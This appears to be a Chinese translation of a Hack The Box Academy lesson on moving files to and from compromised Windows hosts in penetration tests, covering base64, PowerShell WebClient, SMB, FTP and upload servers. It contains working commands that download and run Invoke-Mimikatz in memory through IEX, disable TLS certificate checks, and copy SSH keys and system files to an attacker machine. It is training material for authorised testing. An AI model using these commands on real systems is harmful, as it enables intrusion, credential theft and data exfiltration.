#filetransfer #hacking [source](https://academy.hackthebox.com/module/24/section/159)

在许多情况下，需要向目标系统传输文件或从目标系统传出文件。让我们想象以下场景：

**场景设定**

在一次渗透测试中，我们通过一个无限制文件上传漏洞在 IIS Web 服务器上获得了远程代码执行（RCE，Remote Code Execution）权限。我们首先上传了一个 web shell（Web 后门），然后给自己发送了一个反向 shell（Reverse Shell，反弹 shell）以进一步枚举系统，尝试提升权限。我们试图使用 PowerShell 传输 [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)（一个用于枚举权限提升向量的 PowerShell 脚本），但 PowerShell 被[应用程序控制策略](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control)阻止了。我们手动进行本地枚举，发现我们拥有 [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege)（模拟权限）。我们需要将一个二进制文件传输到目标机器上，以便使用 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 工具提升权限。然后我们尝试使用 [Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) 直接从我们自己的 GitHub 下载我们编译的文件，但该组织有强大的 Web 内容过滤。我们无法访问 GitHub、Dropbox、Google Drive 等可用于传输文件的网站。接下来，我们设置了一个 FTP 服务器，并尝试使用 Windows FTP 客户端传输文件，但网络防火墙阻止了 21 端口（TCP）的出站流量。我们尝试使用 [Impacket smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) 工具创建一个文件夹，发现 TCP 445 端口（SMB）的出站流量是允许的。我们使用这种文件传输方法成功地将二进制文件复制到目标机器上，并实现了将权限提升到管理员级别用户的目标。

了解执行文件传输的不同方式以及网络如何运作可以帮助我们在评估过程中实现目标。我们必须注意可能阻止我们行动的主机控制措施，例如应用程序白名单或阻止特定应用程序或活动的 AV/EDR（防病毒软件/端点检测与响应）。文件传输还受到网络设备的影响，如防火墙、IDS（入侵检测系统）或 IPS（入侵防御系统），它们可能监控或阻止特定端口或不常见的操作。

文件传输是任何操作系统的核心功能，存在许多工具可以实现这一点。然而，许多这些工具可能被细心的管理员阻止或监控，因此值得回顾在特定环境中可能使用的一系列技术。

本模块涵盖了利用 Windows 和 Linux 系统上常见工具和应用程序的技术。技术列表并非详尽无遗。本模块中的信息也可以作为参考指南，用于完成其他 HTB Academy 模块的学习，因为许多模块内的练习需要我们向/从目标主机或提供的 Pwnbox 传输文件。提供了目标 Windows 和 Linux 机器来完成本模块的一些实践练习。值得利用这些目标来尝试模块章节中演示的尽可能多的技术。观察不同传输方法之间的细微差别，并记录下它们可能有用的情况。完成本模块后，请在其他 HTB Academy 模块以及 HTB 主平台上的靶机和实验室中尝试各种技术。#windows #filetransfer #hacking #powershell [source](https://academy.hackthebox.com/module/24/section/160)

## 简介

Windows 操作系统在过去几年中不断发展，新版本带来了不同的文件传输操作实用程序。了解 Windows 中的文件传输可以帮助攻击者和防御者。攻击者可以使用各种文件传输方法进行操作并避免被发现。防御者可以了解这些方法的工作原理，以监控和创建相应的策略来避免被入侵。让我们以 [Microsoft Astaroth 攻击](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)博客文章为例来说明高级持续性威胁（APT，Advanced Persistent Threat）。

这篇博客文章开头讨论了[无文件威胁](https://docs.microsoft.com/en-us/microsoft-365/security/intelligence/fileless-threats?view=o365-worldwide)。"无文件"一词表明威胁不是通过文件传入的，它们使用系统内置的合法工具来执行攻击。这并不意味着没有文件传输操作。如本节稍后讨论的，文件并不"存在"于系统中，而是在内存中运行。

`Astaroth 攻击`通常遵循以下步骤：钓鱼邮件中的恶意链接指向一个 LNK 文件。双击时，LNK 文件导致执行 [WMIC 工具](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic)并带有"/Format"参数，这允许下载和执行恶意 JavaScript 代码。JavaScript 代码反过来通过滥用 [Bitsadmin 工具](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool)下载有效载荷。

所有有效载荷都经过 base64 编码，并使用 Certutil 工具解码，生成几个 DLL 文件。然后使用 [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) 工具加载其中一个解码的 DLL，该 DLL 解密并加载其他文件，直到最终的有效载荷 Astaroth 被注入到 `Userinit` 进程中。下面是攻击的图形描述。

![image](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)

[Image source](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

这是一个很好的例子，展示了多种文件传输方法以及威胁行为者如何使用这些方法绕过防御。

本节将讨论使用一些原生 Windows 工具进行下载和上传操作。在模块后面，我们将讨论 Windows 和 Linux 上的 `Living Off The Land`（离地攻击）二进制文件以及如何使用它们执行文件传输操作。

---

## 下载操作

我们可以访问机器 `MS02`，我们需要从 `Pwnbox` 机器下载一个文件。让我们看看如何使用多种文件下载方法来实现这一点。

![image](https://academy.hackthebox.com/storage/modules/24/WIN-download-PwnBox.png)

## PowerShell Base64 编码和解码

根据我们要传输的文件大小，我们可以使用不需要网络通信的不同方法。如果我们可以访问终端，我们可以将文件编码为 base64 字符串，从终端复制其内容，并执行反向操作，将文件解码为原始内容。让我们看看如何使用 PowerShell 来实现这一点。

使用此方法的一个重要步骤是确保编码和解码的文件是正确的。我们可以使用 [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html)，这是一个计算和验证 128 位 MD5 校验和的程序。MD5 哈希作为文件的紧凑数字指纹，这意味着文件在任何地方都应该具有相同的 MD5 哈希。让我们尝试传输一个示例 ssh 密钥。它可以是任何其他东西，从我们的 Pwnbox 传输到 Windows 目标。

#### Pwnbox 检查 SSH 密钥 MD5 哈希

Pwnbox Check SSH Key MD5 Hash

```shell-session
tr01ax@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

#### Pwnbox 将 SSH 密钥编码为 Base64

Pwnbox Encode SSH Key to Base64

```shell-session
tr01ax@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

我们可以复制此内容并将其粘贴到 Windows PowerShell 终端中，并使用一些 PowerShell 函数对其进行解码。

Pwnbox Encode SSH Key to Base64

```powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

最后，我们可以使用 [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet 确认文件是否成功传输，它与 `md5sum` 做的事情相同。

#### 确认 MD5 哈希匹配

Confirming the MD5 Hashes Match

```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

**注意：** 虽然这种方法很方便，但并不总是可行。Windows 命令行实用程序 (cmd.exe) 的最大字符串长度为 8,191 个字符。此外，如果您尝试发送非常大的字符串，web shell 可能会出错。

---

## PowerShell Web 下载

大多数公司允许通过防火墙的 `HTTP` 和 `HTTPS` 出站流量以提高员工生产力。利用这些传输方法进行文件传输操作非常方便。但是，防御者可以使用 Web 过滤解决方案来阻止访问特定网站类别、阻止下载文件类型（如 .exe），或者在更受限制的网络中只允许访问白名单域名列表。

PowerShell 提供了许多文件传输选项。在任何版本的 PowerShell 中，[System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) 类可用于通过 `HTTP`、`HTTPS` 或 `FTP` 下载文件。以下[表格](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0)描述了从资源下载数据的 WebClient 方法：

|**方法**|**描述**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|以 [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0) 形式返回资源数据。|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|不阻塞调用线程地返回资源数据。|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|从资源下载数据并返回字节数组。|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|不阻塞调用线程地从资源下载数据并返回字节数组。|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|从资源下载数据到本地文件。|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|不阻塞调用线程地从资源下载数据到本地文件。|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|从资源下载字符串并返回字符串。|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|不阻塞调用线程地从资源下载字符串。|

让我们探索一些使用 PowerShell 下载文件的方法示例。

#### PowerShell DownloadFile 方法

我们可以指定类名 `Net.WebClient` 和方法 `DownloadFile`，参数对应于要下载的目标文件的 URL 和输出文件名。

#### 文件下载

File Download

```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```

#### PowerShell DownloadString - 无文件方法

正如我们之前讨论的，无文件攻击通过使用一些操作系统函数来下载有效载荷并直接执行它。PowerShell 也可以用来执行无文件攻击。我们可以使用 [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet 或别名 `IEX` 直接在内存中运行 PowerShell 脚本，而不是将其下载到磁盘。

PowerShell DownloadString - Fileless Method

```powershell-session
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX` 也接受管道输入。

PowerShell DownloadString - Fileless Method

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### PowerShell Invoke-WebRequest

从 PowerShell 3.0 开始，[Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet 也可用，但下载文件明显较慢。您可以使用别名 `iwr`、`curl` 和 `wget` 来代替 `Invoke-WebRequest` 全名。

PowerShell Invoke-WebRequest

```powershell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y 在[这里](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)编译了一份详尽的 PowerShell 下载 cradles（下载启动器）列表。值得熟悉它们及其细微差别，例如缺乏代理感知或接触磁盘（将文件下载到目标上），以便为情况选择合适的方法。

#### PowerShell 常见错误

有时可能会出现 Internet Explorer 首次启动配置尚未完成的情况，这会阻止下载。

![image](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)

可以使用参数 `-UseBasicParsing` 绕过此问题。

Common Errors with PowerShell

```powershell-session
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

PowerShell 下载中的另一个错误与 SSL/TLS 安全通道有关，如果证书不受信任。我们可以使用以下命令绕过该错误：

Common Errors with PowerShell

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## SMB 下载

^ba0edb

服务器消息块协议（SMB 协议）运行在 TCP/445 端口，在运行 Windows 服务的企业网络中很常见。它使应用程序和用户能够向远程服务器传输文件和从远程服务器传输文件。

我们可以使用 SMB 从 Pwnbox 轻松下载文件。我们需要使用 Impacket 的 [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) 在 Pwnbox 中创建一个 SMB 服务器，然后使用 `copy`、`move`、PowerShell `Copy-Item` 或任何其他允许连接到 SMB 的工具。

#### 创建 SMB 服务器

Create the SMB Server

```shell-session
tr01ax@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

要从 SMB 服务器下载文件到当前工作目录，我们可以使用以下命令：

#### 从 SMB 服务器复制文件

Copy a File from the SMB Server

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

新版本的 Windows 会阻止未经身份验证的访客访问，如以下命令所示：

Copy a File from the SMB Server

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

要在这种情况下传输文件，我们可以使用 Impacket SMB 服务器设置用户名和密码，并将 SMB 服务器挂载到我们的 Windows 目标机器上：

#### 使用用户名和密码创建 SMB 服务器

Create the SMB Server with a Username and Password

```shell-session
tr01ax@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### 使用用户名和密码挂载 SMB 服务器

Mount the SMB Server with Username and Password

```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

**注意：** 如果使用 `copy filename \\IP\sharename` 时收到错误，您也可以挂载 SMB 服务器。

---

## FTP 下载

^cd00c2

另一种传输文件的方式是使用 FTP（文件传输协议），它使用 TCP/21 和 TCP/20 端口。我们可以使用 FTP 客户端或 PowerShell Net.WebClient 从 FTP 服务器下载文件。

我们可以使用 Python3 `pyftpdlib` 模块在攻击主机上配置 FTP 服务器。可以使用以下命令安装：

#### 安装 FTP 服务器 Python3 模块 - pyftpdlib

Installing the FTP Server Python3 Module - pyftpdlib

```shell-session
tr01ax@htb[/htb]$ sudo pip3 install pyftpdlib
```

然后我们可以指定端口号 21，因为默认情况下 `pyftpdlib` 使用端口 2121。如果我们不设置用户和密码，默认启用匿名身份验证。

#### 设置 Python3 FTP 服务器

Setting up a Python3 FTP Server

```shell-session
tr01ax@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

设置好 FTP 服务器后，我们可以使用 Windows 预装的 FTP 客户端或 PowerShell `Net.WebClient` 进行文件传输。

#### 使用 PowerShell 从 FTP 服务器传输文件

Transfering Files from an FTP Server Using PowerShell

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

当我们在远程机器上获得 shell 时，我们可能没有交互式 shell。如果是这种情况，我们可以创建一个 FTP 命令文件来下载文件。首先，我们需要创建一个包含我们要执行的命令的文件，然后使用 FTP 客户端使用该文件下载文件。

#### 为 FTP 客户端创建命令文件并下载目标文件

Create a Command File for the FTP Client and Download the Target File

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

---

## 上传操作

^32a07c

还有一些情况，如密码破解、分析、数据外泄等，我们必须将文件从目标机器上传到攻击主机。我们可以使用与下载操作相同的方法，但现在用于上传。让我们看看如何通过各种方式完成文件上传。

---

## PowerShell Base64 编码和解码

我们看到了如何使用 PowerShell 解码 base64 字符串。现在，让我们执行反向操作并编码一个文件，以便我们可以在攻击主机上解码它。

#### 使用 PowerShell 编码文件

Encode File Using PowerShell

```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgBob3N0IG5hbWUgc2hvdWxkIGJlIHNlcGFyYXRlZCBieSBhdCBsZWFzdCBvbmUNCiMgc3BhY2UuDQojDQojIEFkZGl0aW9uYWxseSwgY29tbWVudHMgKHN1Y2ggYXMgdGhlc2UpIG1heSBiZSBpbnNlcnRlZCBvbiBpbmRpdmlkdWFsDQojIGxpbmVzIG9yIGZvbGxvd2luZyB0aGUgbWFjaGluZSBuYW1lIGRlbm90ZWQgYnkgYSAnIycgc3ltYm9sLg0KIw0KIyBGb3IgZXhhbXBsZToNCiMNCiMgICAgICAxMDIuNTQuOTQuOTcgICAgIHJoaW5vLmFjbWUuY29tICAgICAgICAgICMgc291cmNlIHNlcnZlcg0KIyAgICAgICAzOC4yNS42My4xMCAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

我们复制此内容并将其粘贴到攻击主机上，使用 `base64` 命令解码它，并使用 `md5sum` 应用程序确认传输是否正确完成。

#### 在 Linux 中解码 Base64 字符串

Decode Base64 String in Linux

```shell-session
tr01ax@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

Decode Base64 String in Linux

```shell-session
tr01ax@htb[/htb]$ md5sum hosts

3688374325b992def12793500307566d  hosts
```

---

## PowerShell Web 上传

^9c2993

PowerShell 没有内置的上传操作函数，但我们可以使用 `Invoke-WebRequest` 或 `Invoke-RestMethod` 来构建我们的上传函数。我们还需要一个接受上传的 Web 服务器，这在大多数常见的 Web 服务器实用程序中不是默认选项。

对于我们的 Web 服务器，我们可以使用 [uploadserver](https://github.com/Densaugeo/uploadserver)，这是 Python [HTTP.server 模块](https://docs.python.org/3/library/http.server.html)的扩展模块，包含文件上传页面。让我们安装它并启动 Web 服务器。

#### 安装配置了上传功能的 Web 服务器

Installing a Configured WebServer with Upload

```shell-session
tr01ax@htb[/htb]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Installing a Configured WebServer with Upload

```shell-session
tr01ax@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

